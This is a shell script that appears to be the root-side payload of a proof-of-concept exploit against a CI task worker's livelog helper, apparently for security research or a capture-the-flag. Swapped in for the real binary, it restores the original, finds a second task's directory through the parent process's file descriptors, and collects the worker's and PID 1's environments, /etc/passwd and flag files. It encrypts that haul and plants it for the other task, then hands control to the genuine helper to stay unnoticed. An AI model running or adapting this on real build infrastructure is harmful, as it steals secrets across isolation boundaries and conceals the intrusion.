# Values prepended by the arming task:
# EXPECTED_LIVELOG_SHA256, PROOF_TAG, and PROOF_CERT_B64.

set +e
umask 077

self_path=$0
restore_target=/usr/local/bin/livelog
restore_tmp="/usr/local/bin/.livelog-taskcluster-restore-$$"
cert_tmp="/tmp/.gw-cot-cert-$$.pem"
proof_tmp="/tmp/.gw-cot-proof-$$.cms"

cleanup() {
  /usr/bin/rm -f "$restore_tmp" "$cert_tmp" "$proof_tmp" 2>/dev/null
}
trap cleanup EXIT HUP INT TERM

# Restore the original livelog before doing anything else. The original is a
# gzip+base64 payload carried by this script, so restoration survives a reboot
# and does not depend on a task-owned file remaining on disk.
payload_line=$(
  /usr/bin/awk '/^__GW_ORIGINAL_LIVELOG_GZIP_BASE64__$/{print NR + 1; exit}' "$self_path" 2>/dev/null
)
if [ -z "$payload_line" ]; then
  exit 126
fi
if ! /usr/bin/tail -n "+$payload_line" "$self_path" 2>/dev/null \
  | /usr/bin/base64 --decode 2>/dev/null \
  | /usr/bin/gzip --decompress --stdout 2>/dev/null >"$restore_tmp"; then
  exit 126
fi
/usr/bin/chmod 0755 "$restore_tmp" 2>/dev/null || exit 126
restored_sha=$(/usr/bin/sha256sum "$restore_tmp" 2>/dev/null | /usr/bin/cut -d ' ' -f 1)
if [ "$restored_sha" != "$EXPECTED_LIVELOG_SHA256" ]; then
  exit 126
fi
/usr/bin/mv -f "$restore_tmp" "$restore_target" 2>/dev/null || exit 126
post_restore_sha=$(/usr/bin/sha256sum "$restore_target" 2>/dev/null | /usr/bin/cut -d ' ' -f 1)
if [ "$post_restore_sha" != "$EXPECTED_LIVELOG_SHA256" ]; then
  exit 126
fi

# BackingLogFeature has already opened the current task's log when livelog is
# started. Resolve that root-owned file descriptor to find the second task's
# directory without guessing its generated username.
task_dir=
for fd in /proc/"$PPID"/fd/*; do
  fd_path=$(/usr/bin/readlink "$fd" 2>/dev/null)
  case "$fd_path" in
    /home/task_*/generic-worker/live_backing.log)
      task_dir=${fd_path%/generic-worker/live_backing.log}
      break
      ;;
  esac
done

case "$task_dir" in
  /home/task_*) proof_file="$task_dir/cot-boundary-proof.cms" ;;
  *) proof_file="/var/tmp/gw-cot-boundary-$PROOF_TAG.cms" ;;
esac

if printf '%s' "$PROOF_CERT_B64" | /usr/bin/base64 --decode >"$cert_tmp" 2>/dev/null; then
  /usr/bin/chmod 0600 "$cert_tmp" 2>/dev/null

  # Sensitive bytes flow directly into CMS encryption. No plaintext proof is
  # written to disk and nothing from this block is sent to stdout or stderr.
  {
    printf '%s\n' 'proof-version=2'
    printf '%s\n' 'primitive=generic-worker-chain-of-trust-certified-log-symlink'
    printf 'parent-pid=%s\n' "$PPID"

    printf '%s\n' '[root-identity]'
    /usr/bin/id 2>/dev/null
    printf 'uid='; /usr/bin/id -u 2>/dev/null
    printf 'gid='; /usr/bin/id -g 2>/dev/null
    printf 'user='; /usr/bin/whoami 2>/dev/null

    printf '%s\n' '[root-process-status]'
    /usr/bin/cat /proc/self/status 2>/dev/null
    printf '%s\n' '[generic-worker-parent-status]'
    /usr/bin/cat /proc/"$PPID"/status 2>/dev/null
    printf '%s\n' '[generic-worker-parent-cmdline]'
    /usr/bin/tr '\000' ' ' </proc/"$PPID"/cmdline 2>/dev/null
    printf '\n'

    printf '%s\n' '[generic-worker-process.env]'
    /usr/bin/tr '\000' '\n' </proc/"$PPID"/environ 2>/dev/null
    printf '%s\n' '[root-wrapper-process.env]'
    /usr/bin/env -0 2>/dev/null | /usr/bin/tr '\000' '\n'
    printf '%s\n' '[pid1-process.env]'
    /usr/bin/tr '\000' '\n' </proc/1/environ 2>/dev/null

    printf '%s\n' '[/etc/passwd]'
    /usr/bin/cat /etc/passwd 2>/dev/null

    printf '%s\n' '[flag-files]'
    for flag_path in \
      /flag /flag.txt /root/flag /root/flag.txt \
      /etc/flag /etc/flag.txt \
      /home/generic-worker/flag /home/generic-worker/flag.txt; do
      if [ -f "$flag_path" ] && [ -r "$flag_path" ]; then
        printf '\n--- %s ---\n' "$flag_path"
        /usr/bin/cat "$flag_path" 2>/dev/null
      fi
    done
  } | /usr/bin/openssl cms \
    -encrypt \
    -binary \
    -aes256 \
    -outform DER \
    -out "$proof_tmp" \
    "$cert_tmp" 2>/dev/null

  if [ -s "$proof_tmp" ]; then
    /usr/bin/mv -f "$proof_tmp" "$proof_file" 2>/dev/null
    /usr/bin/chmod 0644 "$proof_file" 2>/dev/null
  fi
fi

/usr/bin/rm -f "$cert_tmp" "$proof_tmp" 2>/dev/null
trap - EXIT HUP INT TERM

# Continue as the genuine helper so the proof task and worker behave normally.
exec "$restore_target"
exit 126
